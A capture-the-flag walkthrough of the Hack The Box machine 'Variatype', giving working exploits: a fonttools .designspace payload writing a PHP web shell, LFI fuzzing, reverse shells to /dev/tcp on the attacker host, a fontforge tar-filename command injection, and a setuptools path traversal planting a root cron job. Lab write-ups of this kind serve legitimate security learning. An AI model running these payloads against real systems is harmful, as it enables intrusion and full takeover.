---
title: "HTB Variatype walkthrough"
date: 2026-03-14
categories: [HTB, Season 10]
tags:  [fonttools, CVE-2025-66034, CVE-2024-25082, CVE-2025-47273, path-traversal, php-webshell]
---

## RECON

First I start off with an nmap scan and find ports 22 and 80 open for ssh and the web site.

```bash
sudo nmap -T4 -A -p- 10.129.12.97 -o nmap.txt 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 08:04 -0400
Nmap scan report for 10.129.12.97
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   73.35 ms 10.10.14.1
2   74.96 ms 10.129.12.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.63 seconds

```



Then I put the domain variatype.htb in the hosts file and proceed with enumerating directories with dirsearch.

```bash
dirsearch -u http://variatype.htb/ --crawl 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                         
 (_||| _) (/_(_|| (_| )                                                                                                                                  
                                                                                                                                                         
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/htb/reds/variatype/reports/http_variatype.htb/__26-03-16_08-09-23.txt

Target: http://variatype.htb/

[08:09:23] Starting:                                                                                                                                     
[08:09:42] 302 -  247B  - /download/history.csv  ->  /tools/variable-font-generator
[08:09:42] 302 -  247B  - /download/users.csv  ->  /tools/variable-font-generator
[08:09:42] 200 -    2KB - /tools/variable-font-generator                    
[08:09:42] 200 -    3KB - /services                                         
[08:09:43] 405 -  153B  - /tools/variable-font-generator/process            
                                                                             
Task Completed    
```



On the home page we see that its a site for uploading .designspace files and font files (.ttf/.otf) to generate  a fully compliant variable fonts. It also says it uses fontools engine which I'll get back to in a bit. On the services page it describes their services a bit more and on tools/variable-font-generator is the upload form.

![Upload Form](/assets/img/posts/htb-variatype/1.png)

![Tool Page](/assets/img/posts/htb-variatype/2.png)![Services Page](/assets/img/posts/htb-variatype/3.png)







To further enumerate i use ffuf to fuzz subdomains and find the portal.variatype.htb subdomain which is certainly interesting. 

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://variatype.htb/ -H "Host:FUZZ.variatype.htb"   -fc 301 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://variatype.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.variatype.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 88ms]
:: Progress: [114442/114442] :: Job [1/1] :: 557 req/sec :: Duration: [0:03:30] :: Errors: 0 ::
```



I put the subdomain in the hosts file and enumerate the directories on this subdomain to find there is .git directory which can be dumped with git-dumper. With the repo dumped looking through the log with git log there is a commit about adding a gitbot user for automation and in it I find the password for the account too with git show.

```bash
dirsearch -u http://portal.variatype.htb/ --crawl
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                         
 (_||| _) (/_(_|| (_| )                                                                                                                                  
                                                                                                                                                         
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/htb/reds/variatype/reports/http_portal.variatype.htb/__26-03-16_08-28-07.txt

Target: http://portal.variatype.htb/

[08:28:07] Starting:                                                                                                                                     
[08:28:09] 301 -  169B  - /.git  ->  http://portal.variatype.htb/.git/      
[08:28:09] 403 -  555B  - /.git/                                            
[08:28:09] 403 -  555B  - /.git/branches/
[08:28:09] 200 -   39B  - /.git/COMMIT_EDITMSG
[08:28:09] 200 -  143B  - /.git/config
[08:28:09] 200 -   73B  - /.git/description
[08:28:09] 200 -   23B  - /.git/HEAD                                        
[08:28:09] 403 -  555B  - /.git/hooks/                                      
[08:28:09] 200 -  137B  - /.git/index                                       
[08:28:09] 403 -  555B  - /.git/info/
[08:28:09] 200 -  240B  - /.git/info/exclude                                
[08:28:09] 403 -  555B  - /.git/logs/                                       
[08:28:09] 200 -  700B  - /.git/logs/HEAD
[08:28:09] 301 -  169B  - /.git/logs/refs  ->  http://portal.variatype.htb/.git/logs/refs/
[08:28:09] 301 -  169B  - /.git/logs/refs/heads  ->  http://portal.variatype.htb/.git/logs/refs/heads/
[08:28:09] 200 -  700B  - /.git/logs/refs/heads/master
[08:28:09] 403 -  555B  - /.git/objects/                                    
[08:28:09] 403 -  555B  - /.git/refs/                                       
[08:28:09] 301 -  169B  - /.git/refs/heads  ->  http://portal.variatype.htb/.git/refs/heads/
[08:28:09] 200 -   41B  - /.git/refs/heads/master
[08:28:09] 301 -  169B  - /.git/refs/tags  ->  http://portal.variatype.htb/.git/refs/tags/
[08:28:21] 200 -    0B  - /auth.php                                         
[08:28:24] 302 -    0B  - /dashboard.php  ->  /                             
[08:28:26] 302 -    0B  - /download.php  ->  /                              
[08:28:27] 301 -  169B  - /files  ->  http://portal.variatype.htb/files/    
[08:28:27] 403 -  555B  - /files/                                           
[08:28:45] 302 -    0B  - /view.php  ->  /                                  
                                                                             
Task Completed   
```

```bash
 git-dumper http://portal.variatype.htb/ git
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Testing http://portal.variatype.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://portal.variatype.htb/.gitignore [404]
[-] http://portal.variatype.htb/.gitignore responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://portal.variatype.htb/.git/description [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-commit.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/post-receive.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/info/exclude [200]
[-] Fetching http://portal.variatype.htb/.git/objects/info/packs [404]
[-] http://portal.variatype.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://portal.variatype.htb/.git/index [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/update.sample [200]
[-] Finding refs/
[-] Fetching http://portal.variatype.htb/.git/FETCH_HEAD [404]
[-] http://portal.variatype.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/ORIG_HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/info/refs [404]
[-] http://portal.variatype.htb/.git/info/refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/main [404]
[-] Fetching http://portal.variatype.htb/.git/config [200]
[-] http://portal.variatype.htb/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/packed-refs [404]
[-] http://portal.variatype.htb/.git/packed-refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/main [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/development [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/stash [404]
[-] http://portal.variatype.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/production [404]
[-] Fetching http://portal.variatype.htb/.git/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/production responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/development responded with status code 404
[-] http://portal.variatype.htb/.git/refs/heads/main responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/HEAD [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/staging [404]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/master responded with status code 404
[-] http://portal.variatype.htb/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/main [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/development [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/production [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/stash [404]
[-] http://portal.variatype.htb/.git/refs/stash responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master [404]
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://portal.variatype.htb/.git/objects/50/30e791b764cb2a50fcb3e2279fea9737444870 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching http://portal.variatype.htb/.git/objects/6f/021da6be7086f2595befaa025a83d1de99478b [200]
[-] Fetching http://portal.variatype.htb/.git/objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d [200]
[-] http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/objects/61/5e621dce970c2c1c16d2a1e26c12658e3669b3 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/03/0e929d424a937e9bd079794a7e1aaf366bcfaf [200]
[-] Fetching http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 [200]
[-] Running git checkout .
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ cd git/.git
                                                                                                                                                         
┌──(kali㉿kali)-[~/…/reds/variatype/git/.git]
└─$ git log                                                     
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation
                                                                                                                                                         
┌──(kali㉿kali)-[~/…/reds/variatype/git/.git]
└─$ git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d         
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
           

        
```

With these credentials I can log into the validation portal.







## SHELL AS WWW-DATA



Researching about fonttools and .designspace files I find an exploit https://github.com/advisories/GHSA-768j-98cg-p3fv for writing files  "to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements" which basically mean I could write a web shell into the webapp's dir to gain RCE. There is also an example .designspace  file and a script to generate ttf files. With this equipped now all that's left is to find the web-root to write for the web shell. Looking at the upload flow once the files are uploaded they go to the validation portal which also has a download endpoint.



![LFI Fuzz](/assets/img/posts/htb-variatype/4.png)





Immediately I fuzz for lfi with jaddix.txt and find the web root depth needed to further enumerate the system. 

```bash
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://portal.variatype.htb/download.php?f=FUZZ' -fs 15 -b "PHPSESSID=r7sut6fi9qrkv3tahhv07cigdt"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.variatype.htb/download.php?f=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header           : Cookie: PHPSESSID=r7sut6fi9qrkv3tahhv07cigdt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 74ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 75ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 75ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 77ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 76ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 76ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 79ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 78ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 79ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 79ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 79ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 80ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 80ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 79ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 81ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 82ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 83ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 83ms]
:: Progress: [930/930] :: Job [1/1] :: 554 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
                                                                                             
```

![Nginx Config](/assets/img/posts/htb-variatype/5.png)



When I confirm lfi I always like to run this wordlist https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt to see all that can be found. Among the files in the lfi wordlist is the nginx conf which would be our target to find the exact place to write to for RCE. I automate this with a bash wrapper script around an python script and log it redirecting the output to a log file. Among this output from everything found is the nginx conf with the exact web root we need.

```bash
┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ cat script.py                                                  
#!/usr/bin/env python3
import requests
import sys

TARGET = "http://portal.variatype.htb/download.php"
COOKIE = {"PHPSESSID": "r7sut6fi9qrkv3tahhv07cigdt"}
BYPASS = "....//....//....//....//....//"

def lfi(path):
    path = path.lstrip("/")
    payload = BYPASS + path
    r = requests.get(TARGET, params={"f": payload}, cookies=COOKIE)
    if r.status_code == 200 and r.text.strip():
        print(r.text)
    else:
        print(f"[-] Got {r.status_code} or empty response")

if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "/etc/passwd"
    lfi(path)
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ cat auto.sh               
for f in $(cat /usr/share/wordlists/lfi.txt)
do
   python3 script.py $f
done
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ cat log | grep nginx 
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;
        include /etc/nginx/mime.types;
        access_log /var/log/nginx/access.log;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/variatype.htb;
        include /etc/nginx/sites-enabled/portal.variatype.htb;
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ python3 script.py /etc/nginx/sites-enabled/portal.variatype.htb
server {
    listen 80;
    server_name portal.variatype.htb;

    root /var/www/portal.variatype.htb/public;
    index index.php;

    access_log /var/log/nginx/portal_access.log;
    error_log /var/log/nginx/portal_error.log;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location /files/ {
        autoindex off;
    }
}

```



With the web root found I prepare the malicious .desingspace file. This writes the shell which I can use to download a bash shell with "curl http://10.10.15.50:8000/shell -o /tmp/shell" and execute it with "bash /tmp/shell"

```bash 
──(kali㉿kali)-[~/htb/reds/variatype/exploit]
└─$ cat mal.designspace
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
        <axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
            <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
                <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
                <labelname xml:lang="fr">MEOW2</labelname>
            </axis>
        </axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
        <sources>
                <source filename="source-light.ttf" name="Light">
                        <location>
                                <dimension name="Weight" xvalue="100"/>
                        </location>
                </source>
                <source filename="source-regular.ttf" name="Regular">
                        <location>
                                <dimension name="Weight" xvalue="400"/>
                        </location>
                </source>
        </sources>
        <variable-fonts>
                <variable-font name="MyFont" filename="../../../var/www/portal.variatype.htb/public/shell.php">
                        <axis-subsets>
                                <axis-subset name="Weight"/>
                        </axis-subsets>
                </variable-font>
        </variable-fonts>
        <instances>
                <instance name="Display Thin" familyname="MyFont" stylename="Thin">
                        <location><dimension name="Weight" xvalue="100"/></location>
                        <labelname xml:lang="en">Display Thin</labelname>
                </instance>
        </instances>
</designspace>


┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ cat shell    
/bin/bash -i >& /dev/tcp/10.10.15.50/9001 0>&1
                                                
```



![Shell www-data](/assets/img/posts/htb-variatype/6.png)







## SHELL AS STEVE

Now with the shell as www-data I found a script running as the user steve. The script uses fontforge to process the file uploaded on the web site or put in to the directory. The script processes several types of files 



![Cron Script](/assets/img/posts/htb-variatype/7.png)



Researching exploits for fontforge I first come across CVE-2025-15274 which wont help us much here. After a bit I find CVE-2024-25082 and a poc for it on https://www.cve.news/cve-2024-25082/ . You can find more about the vulnerability and the exploit on the link but basically the exploit is command injection in the sfd file name inside a tar file. Next is to prepare the exploit and start the python web server.

```bash
──(kali㉿kali)-[~/htb/reds/variatype]
└─$ python3 exploit.py     
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ cat exploit.py         
import tarfile
from io import BytesIO

malicious_name = "evilfont.sfd;bash -c '/bin/bash -i >& /dev/tcp/10.10.15.50/9000 0>&1';"
with tarfile.open('exploit.tar', 'w') as tar:
    tarinfo = tarfile.TarInfo(name=malicious_name)
    tarinfo.size = 0  # Explicitly set to zero
    tar.addfile(tarinfo, fileobj=BytesIO())  # Provide empty file object   
                                                                         
```

On target.

```bash
www-data@variatype:~/portal.variatype.htb/public$ curl http://10.10.15.50:8000/exploit.tar -o /var/www/portal.variatype.htb/public/files/exploit.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10240  100 10240    0     0  64290      0 --:--:-- --:--:-- --:--:-- 64402

```

![Shell Steve](/assets/img/posts/htb-variatype/8.png)











## SHELL AS ROOT

![Sudo Privesc](/assets/img/posts/htb-variatype/9.png)



Steve can run the install_vallidator.py python script as root. The script downloads a plugin from the url the user supplies as an arguments and attempts to install it. It uses setuptools.PackageIndex().download()  that has a path traversal vulnerability (CVE-2025-47273) in versions prior to 78.1.1, allowing an attacker to write files to arbitrary filesystem locations with the permissions of the running process. 

```bash
steve@variatype:/tmp/ffarchive-21765-1$ python3 -c "import setuptools; print(setuptools.__version__)"
78.1.0
steve@variatype:/tmp/ffarchive-21765-1$ 

```

The vulnerability is in this function from setuptools.

```bash
 def _download_url(self, url, tmpdir):
        # Determine download filename
        #
        name, _fragment = egg_info_for_url(url)
        if name:
            while '..' in name:
                name = name.replace('..', '.').replace('\\', '_')
        else:
            name = "__downloaded__"  # default if URL has no path contents

        if name.endswith('.[egg.zip](http://egg.zip/)'):
            name = name[:-4]  # strip the extra .zip before download

 -->       filename = os.path.join(tmpdir, name)
```





With the confirmed version and a custom server serving the payload for any requests  with the right url supplied we can get root. The URL parser will treat the encoded slashes as literal characters, but when `unquote` decodes them, the last path component becomes `/etc/cron.d/evil`, which is exactly what the exploit needs.



On attack host:

```bash
─$ cat server.py          
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[*] Request path: {self.path}")
        payload = b"* * * * * root chmod u+s /bin/bash\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)
        print(f"[*] Payload sent")

HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/variatype]
└─$ python3 server.py                                              
[*] Request path: /%2Fetc%2Fcron.d%2Fevil
10.129.12.97 - - [16/Mar/2026 10:37:42] "GET /%2Fetc%2Fcron.d%2Fevil HTTP/1.1" 200 -
[*] Payload sent

```



On target:

```bash
steve@variatype:/tmp/ffarchive-21765-1$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://10.10.15.50/%2Fetc%2Fcron.d%2Fevil"
2026-03-16 10:37:42,755 [INFO] Attempting to install plugin from: http://10.10.15.50/%2Fetc%2Fcron.d%2Fevil
2026-03-16 10:37:42,764 [INFO] Downloading http://10.10.15.50/%2Fetc%2Fcron.d%2Fevil
2026-03-16 10:37:42,914 [INFO] Plugin installed at: /etc/cron.d/evil
[+] Plugin installed successfully.
steve@variatype:/tmp/ffarchive-21765-1$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Sep  6  2025 /bin/bash
steve@variatype:/tmp/ffarchive-21765-1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Sep  6  2025 /bin/bash
steve@variatype:/tmp/ffarchive-21765-1$ /bin/bash -p
bash-5.2# cat /root/root.txt
86d...

```

We get the shell and the root flag finishing the machine. 